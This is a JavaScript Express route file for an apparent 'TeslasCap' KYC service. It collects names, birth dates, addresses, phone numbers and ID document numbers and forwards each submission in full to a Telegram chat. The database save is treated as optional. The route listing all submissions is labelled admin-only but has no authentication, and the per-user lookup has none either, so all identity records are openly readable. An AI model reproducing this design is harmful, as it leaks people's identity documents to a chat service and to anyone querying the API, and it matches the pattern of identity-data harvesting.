const express = require('express');
const pool = require('../database');
const { sendTelegramMessage } = require('../services/telegramService');

const router = express.Router();

/**
 * Format KYC data for Telegram
 * @param {object} data - KYC form data
 * @returns {string} - Formatted message
 */
function formatKYCMessage(data) {
  const timestamp = new Date().toLocaleString();
  
  const message = `
<b>🔐 New KYC Verification Submission</b>

<b>Time:</b> ${timestamp}

<b>📋 Personal Information:</b>
<b>First Name:</b> ${data.firstName}
<b>Last Name:</b> ${data.lastName}
<b>Date of Birth:</b> ${data.dateOfBirth}

<b>📍 Address Information:</b>
<b>Country:</b> ${data.country}
<b>State/Province:</b> ${data.state}
<b>City:</b> ${data.city}
<b>Street Address:</b> ${data.streetAddress}
<b>Postal Code:</b> ${data.postalCode}

<b>📞 Contact Information:</b>
<b>Phone:</b> ${data.phone}

<b>🪪 Document Information:</b>
<b>Document Type:</b> ${data.documentType}
<b>Document Number:</b> ${data.documentNumber}
<b>Expiry Date:</b> ${data.expiryDate}

<b>📝 Additional Info:</b>
<b>Occupation:</b> ${data.occupation}
<b>Income Source:</b> ${data.incomeSource}

<b>✅ Status:</b> Pending Review

---
<i>Sent from TeslasCap KYC System</i>
  `.trim();

  return message;
}

/**
 * POST /api/kyc/submit
 * Submit KYC verification and send to Telegram
 */
router.post('/submit', async (req, res) => {
  try {
    const {
      firstName,
      lastName,
      dateOfBirth,
      country,
      state,
      city,
      streetAddress,
      postalCode,
      phone,
      documentType,
      documentNumber,
      expiryDate,
      occupation,
      incomeSource,
      userId
    } = req.body;

    // Validate required fields
    const requiredFields = [
      'firstName',
      'lastName',
      'dateOfBirth',
      'country',
      'state',
      'city',
      'streetAddress',
      'postalCode',
      'phone',
      'documentType',
      'documentNumber',
      'expiryDate'
    ];

    const missingFields = requiredFields.filter(field => !req.body[field]);
    if (missingFields.length > 0) {
      return res.status(400).json({
        success: false,
        message: `Missing required fields: ${missingFields.join(', ')}`
      });
    }

    // Save KYC submission to database (optional)
    try {
      await pool.query(`
        INSERT INTO kyc_submissions 
        (userId, firstName, lastName, dateOfBirth, country, state, city, streetAddress, postalCode, phone, documentType, documentNumber, expiryDate, occupation, incomeSource, status)
        VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16)
      `, [
        userId || null,
        firstName,
        lastName,
        dateOfBirth,
        country,
        state,
        city,
        streetAddress,
        postalCode,
        phone,
        documentType,
        documentNumber,
        expiryDate,
        occupation || null,
        incomeSource || null,
        'pending'
      ]);
    } catch (dbError) {
      console.log('ℹ️  Database table might not exist yet, continuing with Telegram send');
    }

    // Send to Telegram
    const kycData = {
      firstName,
      lastName,
      dateOfBirth,
      country,
      state,
      city,
      streetAddress,
      postalCode,
      phone,
      documentType,
      documentNumber,
      expiryDate,
      occupation,
      incomeSource
    };

    const message = formatKYCMessage(kycData);
    const telegramResult = await sendTelegramMessage(message);

    res.json({
      success: true,
      message: 'KYC submission received successfully',
      telegramStatus: telegramResult ? true : false,
      details: {
        firstName,
        lastName,
        country,
        timestamp: new Date().toISOString()
      }
    });
  } catch (error) {
    console.error('KYC submission error:', error);
    res.status(500).json({
      success: false,
      message: 'Failed to process KYC submission',
      error: error.message
    });
  }
});

/**
 * GET /api/kyc/submissions
 * Get all KYC submissions (admin only)
 */
router.get('/submissions', async (req, res) => {
  try {
    const submissions = await pool.query(`
      SELECT * FROM kyc_submissions
      ORDER BY createdAt DESC
    `);

    res.json({
      success: true,
      submissions: submissions.rows
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: 'Failed to fetch submissions',
      error: error.message
    });
  }
});

/**
 * GET /api/kyc/submission/:userId
 * Get KYC submission for a specific user
 */
router.get('/submission/:userId', async (req, res) => {
  try {
    const { userId } = req.params;

    const submission = await pool.query(`
      SELECT * FROM kyc_submissions
      WHERE userId = $1
      ORDER BY createdAt DESC
      LIMIT 1
    `, [userId]);

    res.json({
      success: true,
      submission: submission.rows.length > 0 ? submission.rows[0] : null
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: 'Failed to fetch submission',
      error: error.message
    });
  }
});

module.exports = router;
